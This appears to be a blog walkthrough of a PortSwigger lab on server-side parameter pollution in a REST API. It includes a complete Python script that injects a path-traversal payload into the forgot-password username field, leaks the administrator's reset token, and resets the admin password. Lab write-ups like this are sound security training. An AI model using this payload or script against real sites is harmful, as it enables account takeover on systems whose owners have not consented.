@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Canonical & SEO -->
+    <title>Server-side Parameter Pollution in REST URL | PortSwigger Lab</title>
+    <meta name="description"
+        content="Exploiting server-side parameter pollution in a REST API to extract sensitive information and reset the administrator's password." />
+    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/api/api5.html" />
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Server-side Parameter Pollution in REST URL | Shubham Ranpise" />
+    <meta property="og:description"
+        content="Learn how server-side parameter pollution can be abused in REST APIs to access unauthorized data and escalate privileges." />
+    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/api/api5.html" />
+    <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Server-side Parameter Pollution in REST URL" />
+    <meta name="twitter:description"
+        content="Explore how REST APIs can be vulnerable to server-side parameter pollution and how to exploit it." />
+    <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://shubhamranpise.com/assets/favicon.png" type="image/png" />
+
+    <!-- Preloads -->
+    <link rel="preload" href="./../../../assets/home_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/theme_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/profile-pic.png" as="image" />
+
+    <!-- Theme & Fonts -->
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
+    <link rel="stylesheet" href="./../../../static/css/style.css" />
+    <link rel="stylesheet" href="./../../../static/css/mediaqueries.css" />
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-45Z0Y6HPDS"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-45Z0Y6HPDS');
+    </script>
+
+    <!-- JSON-LD Schema -->
+    <script type="application/ld+json">
+        {
+          "@context": "https://schema.org",
+          "@type": "LearningResource",
+          "name": "Server-side Parameter Pollution in REST URL",
+          "description": "Step-by-step walkthrough of a PortSwigger lab exploiting server-side parameter pollution in a REST API endpoint to extract sensitive information and reset an administrator's password.",
+          "author": {
+            "@type": "Person",
+            "name": "Shubham Ranpise"
+          },
+          "datePublished": "2025-04-21",
+          "educationalUse": "practice",
+          "learningResourceType": "walkthrough",
+          "url": "https://shubhamranpise.com/ctf/portswigger/api1.html",
+          "image": "https://shubhamranpise.com/assets/og-image.jpg",
+          "publisher": {
+            "@type": "Organization",
+            "name": "shubhamranpise.com"
+          }
+        }
+        </script>
+</head>
+
+
+<body>
+    <header>
+        <nav id="desktop-nav">
+            <div class="logo">
+                <a href="./../../../index.html" class="logo-wrapper">
+                    <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                        src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                    <span>Shubham</span>
+                </a>
+            </div>
+
+            <div>
+                <ul class="nav-links">
+                    <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                    <li><a href="./../../../notes/notes.html">Notes</a></li>
+                    <li><a href="./../../../about/about.html">About</a></li>
+                    <li>
+                        <img id="modeToggle" class="icon color-icon" src="./../../../assets/theme_light.png"
+                            src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                            alt="Color theme icon" />
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <nav id="hamburger-nav">
+        <div class="logo">
+            <a href="./../../../index.html" class="logo-wrapper">
+                <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                    src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                <span>Shubham</span>
+            </a>
+        </div>
+        <div class="hamburger-menu">
+            <div class="hamburger-icon" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="menu-links">
+                <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                <li><a href="./../../../notes/notes.html">Notes</a></li>
+                <li><a href="./../../../about/about.html">About</a></li>
+                <li>
+                    <img id="modeToggle2" class="icon color-icon" src="./../../../assets/theme_light.png"
+                        src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                        alt="Color theme icon" />
+                </li>
+            </div>
+        </div>
+    </nav>
+
+    <div class="breadcrumb-wrapper">
+        <p class="breadcrumb-text">/
+            <a href="./../../../index.html">Home</a>/
+            <a href="./../../ctf.html">Ctf</a>/
+          <a href="./../portswigger.html">Portswigger</a>/
+          <span>API 5</span>
+        </p>
+      </div>
+      <br>
+
+    <section id="ctf">
+        <h2 class="lab-heading">Exploiting server-side parameter pollution in a REST URL</h2>
+        <div class="lab-section">
+            <h3 class="lab-date">🕗 21-April-2025</h3>
+            <h3 class="lab-subheading">📚 What I Learned</h3>
+            <p>In this lab, I explored how server-side parameter pollution (SSPP) can impact REST API endpoints. The vulnerability stemmed from how the server processed multiple parameters—particularly when using path traversal techniques in user-controlled input. By injecting a crafted payloads into a form field, I was able to access internal object properties not intended for exposure. This led to the retrieval of the admin’s password reset token and ultimately a full account takeover.<br><br>Additionally, the challenge reinforced the importance of inspecting JavaScript files used by the web application. One of the JS files revealed the internal API structure and helped uncover how parameters were handled by the backend, which was crucial for crafting the payload. It’s a reminder that client-side JavaScript can leak sensitive implementation details useful for attackers.</p>
+
+            <h3 class="lab-subheading">⚙️ How Exploit Works</h3>
+            <p>
+                [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
+                [+] Visit the "Forgot Password" page and request a reset token.<br>
+                [+] Revisit the page and inject a polluted path as the username:<br><i>../../v1/users/administrator/field/passwordResetToken#</i>.<br>
+                [+] The server returns the reset token in the JSON response.<br>
+                [+] Use the token to reset the admin password and take control of the account.</p>
+
+            <h3 class="lab-subheading">🖥️ Command to Run</h3>
+            <div class="code-block-wrapper">
+                <pre><code>python3 exploit.py https://&lt;your-lab-id&gt;.web-security-academy.net
+</code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+
+            <br>
+            <div class="code-block-wrapper">
+                <pre><code>import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+import json
+
+# Disable SSL warnings (Burp Suite, lab environments)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Proxy configuration
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+def get_csrf_token(session, base_url):
+    """
+    Fetch the CSRF token from the forgot-password page.
+    """
+    uri = '/forgot-password'
+    response = session.get(base_url + uri, verify=False, proxies=proxies)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf = soup.find("input", {"name": "csrf"})['value']
+    return csrf
+
+def initial_request(session, base_url, csrf):
+    """
+    Submit the normal forgot-password request to trigger token generation.
+    """
+    uri = '/forgot-password'
+    data = {
+        "csrf": csrf,
+        "username": "administrator"
+    }
+    session.post(base_url + uri, data=data, verify=False, proxies=proxies)
+
+def exploit_api(session, base_url, csrf):
+    """
+    Exploit path traversal to retrieve the password reset token.
+    """
+    uri = '/forgot-password'
+    payload = "../../v1/users/administrator/field/passwordResetToken%23"
+    data = {
+        "csrf": csrf,
+        "username": payload
+    }
+
+    response = session.post(base_url + uri, data=data, verify=False, proxies=proxies)
+
+    try:
+        result = response.json()
+        token = result['result']
+        return token
+    except (ValueError, KeyError) as e:
+        print("[-] Failed to extract token from JSON response.")
+        print(f"[-] Raw response: {response.text}")
+        sys.exit(1)
+
+def reset_password(session, base_url, token, csrf):
+    """
+    Reset the administrator's password using the extracted token.
+    """
+    uri = f'/forgot-password?passwordResetToken={token}'
+    data = {
+        "csrf": csrf,
+        "passwordResetToken": token,
+        "new-password-1": "Password@123",
+        "new-password-2": "Password@123"
+    }
+
+    response = session.post(base_url + uri, data=data, verify=False, proxies=proxies)
+
+    if "Password successfully changed" in response.text or response.status_code == 200:
+        print("[+] Password reset successful!")
+        print("[+] Use the following credentials to log in:")
+        print("    Username: administrator")
+        print("    Password: Password@123")
+    else:
+        print("[-] Password reset may have failed.")
+        print(response.text)
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+    except IndexError:
+        print(f"[-] Usage: python {sys.argv[0]} &lt;url&gt;")
+        print(f"[-] Example: python {sys.argv[0]} https://target.com")
+        sys.exit(1)
+
+    session = requests.Session()
+
+    # Step 1: Get CSRF token
+    csrf_token = get_csrf_token(session, url)
+
+    # Step 2: Trigger generation of password reset token
+    initial_request(session, url, csrf_token)
+
+    # Step 3: Re-fetch CSRF token (in case it's regenerated)
+    csrf_token = get_csrf_token(session, url)
+
+    # Step 4: Exploit to retrieve the reset token
+    reset_token = exploit_api(session, url, csrf_token)
+
+    # Step 5: Use the token to reset the password
+    reset_password(session, url, reset_token, csrf_token)
+</code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+    </section>
+
+    <footer>
+        <p>Copyright &#169; 2025 Shubham Ranpise.</p>
+    </footer>
+
+    <script src="./../../../static/js/main.js"></script>
+</body>
+
+</html>
